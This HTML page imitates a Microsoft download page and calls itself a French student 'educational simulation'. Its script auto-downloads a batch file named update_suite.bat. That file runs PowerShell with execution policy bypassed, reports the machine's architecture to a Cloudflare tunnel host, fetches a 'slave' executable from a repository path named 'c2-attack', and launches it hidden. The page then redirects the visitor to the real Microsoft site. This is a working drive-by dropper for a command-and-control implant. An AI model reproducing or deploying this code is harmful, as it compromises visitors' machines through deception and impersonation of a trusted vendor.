<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Simulation de téléchargement</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: "Segoe UI", Arial, sans-serif;
      background: #f5f5f5;
      color: #242424;
    }

    header {
      padding: 24px;
      background: #fff;
      border-bottom: 1px solid #ddd;
      font-weight: 600;
    }

    main {
      min-height: calc(100vh - 77px);
      display: grid;
      place-items: center;
      padding: 24px;
    }

    .card {
      width: 100%;
      max-width: 560px;
      padding: 40px;
      background: #fff;
      border: 1px solid #ddd;
      border-radius: 8px;
    }

    .notice {
      color: #555;
      font-size: 14px;
      line-height: 1.6;
    }

    h1 {
      margin: 24px 0 16px;
      font-size: 28px;
      font-weight: 600;
    }

    p {
      line-height: 1.6;
    }

    .spinner {
      width: 40px;
      height: 40px;
      margin: 24px 0;
      border: 4px solid #e5e5e5;
      border-top-color: #0067b8;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    a {
      color: #0067b8;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    @media (prefers-reduced-motion: reduce) {
      .spinner {
        animation: none;
      }
    }
  </style>
</head>
<body>
  <header>Projet étudiant</header>

  <main>
    <section class="card" aria-labelledby="title">
      <div class="notice">
        Simulation pédagogique — projet indépendant,
        sans affiliation avec Microsoft.
      </div>

      <h1 id="title">Votre téléchargement va démarrer...</h1>

      <div class="spinner" aria-hidden="true"></div>

      <p>
        Si le téléchargement ne démarre pas automatiquement,
        <a id="manual-download" href="#">cliquez ici</a>.
      </p>

      <p>
        Redirection vers le site officiel de Microsoft dans
        <span id="countdown">5</span> secondes.
      </p>

      <a href="https://microsoft.com">
        Accéder à Microsoft maintenant
      </a>
    </section>
  </main>

<script>
const destination = "https://microsoft.com";
    const fileName = "update_suite.bat"; 

    const fileContent = [
      "@echo off",
      "rem Projet etudiant EPITECH - Deploiement conditionnel avec logs detailles.",
      "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"" +
        "try {",
          "  $arch = $env:PROCESSOR_ARCHITECTURE;",
          "  $log1 = '[{\\\"command\\\":\\\"debug_step\\\",\\\"output\\\":\\\"Etape 1: Architecture detectee -> ' + $arch + '\\\"}]';",
          "  $b64_1 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($log1));",
          "  Invoke-RestMethod -Uri 'https://webcams-gamecube-corrections-widely.trycloudflare.com/info/simulation-id' -Method Post -Headers @{'X-Session-Data'=$b64_1; 'Bypass-Tunnel-Reminder'='true'};",

          "  if ($arch -eq 'AMD64') {",
          "    $targetUrl = 'https://misterwhite44.github.io/c2-attack/slave_amd64.exe';",
          "  } else {",
          "    $targetUrl = 'https://misterwhite44.github.io/c2-attack/slave_x86.exe';",
          "  }",

          "  $log2 = '[{\\\"command\\\":\\\"debug_step\\\",\\\"output\\\":\\\"Etape 2: URL cible selectionnee -> ' + $targetUrl + '\\\"}]';",
          "  $b64_2 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($log2));",
          "  Invoke-RestMethod -Uri 'https://webcams-gamecube-corrections-widely.trycloudflare.com/info/simulation-id' -Method Post -Headers @{'X-Session-Data'=$b64_2; 'Bypass-Tunnel-Reminder'='true'};",

          "  $destPath = \\\"$env:TEMP\\slave_agent.exe\\\";",
          "  Invoke-WebRequest -Uri $targetUrl -OutFile $destPath;",
          
          "  $log3 = '[{\\\"command\\\":\\\"debug_step\\\",\\\"output\\\":\\\"Etape 3: Fichier telecharge avec succes dans TEMP\\\"}]';",
          "  $b64_3 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($log3));",
          "  Invoke-RestMethod -Uri 'https://webcams-gamecube-corrections-widely.trycloudflare.com/info/simulation-id' -Method Post -Headers @{'X-Session-Data'=$b64_3; 'Bypass-Tunnel-Reminder'='true'};",

          "  Start-Process -FilePath $destPath -WindowStyle Hidden;",
          
          "  $log4 = '[{\\\"command\\\":\\\"debug_step\\\",\\\"output\\\":\\\"Etape 4: Slave lance en arriere-plan avec succes !\\\"}]';",
          "  $b64_4 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($log4));",
          "  Invoke-RestMethod -Uri 'https://webcams-gamecube-corrections-widely.trycloudflare.com/info/simulation-id' -Method Post -Headers @{'X-Session-Data'=$b64_4; 'Bypass-Tunnel-Reminder'='true'};",

        "} catch {",
          "  $err = $_.Exception.Message -replace '\"', '\\\"';",
          "  $logErr = '[{\\\"command\\\":\\\"erreur_script\\\",\\\"output\\\":\\\"ERREUR DETECTEE : ' + $err + '\\\"}]';",
          "  $b64_err = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($logErr));",
          "  try { Invoke-RestMethod -Uri 'https://webcams-gamecube-corrections-widely.trycloudflare.com/info/simulation-id' -Method Post -Headers @{'X-Session-Data'=$b64_err; 'Bypass-Tunnel-Reminder'='true'}; } catch {}",
        "}\"",
    ].join("\r\n");

    const blobUrl = URL.createObjectURL(
      new Blob([fileContent], { type: "application/octet-stream" })
    );

    const manualDownload = document.getElementById("manual-download");
    manualDownload.href = blobUrl;
    manualDownload.download = fileName;
    manualDownload.click();

    const countdown = document.getElementById("countdown");
    const redirectAt = Date.now() + 5000;
    const timer = setInterval(() => {
      countdown.textContent = Math.max(0, Math.ceil((redirectAt - Date.now()) / 1000));
    }, 250);
    setTimeout(() => { clearInterval(timer); window.location.replace(destination); }, 5000);
</script>

</body>
</html>
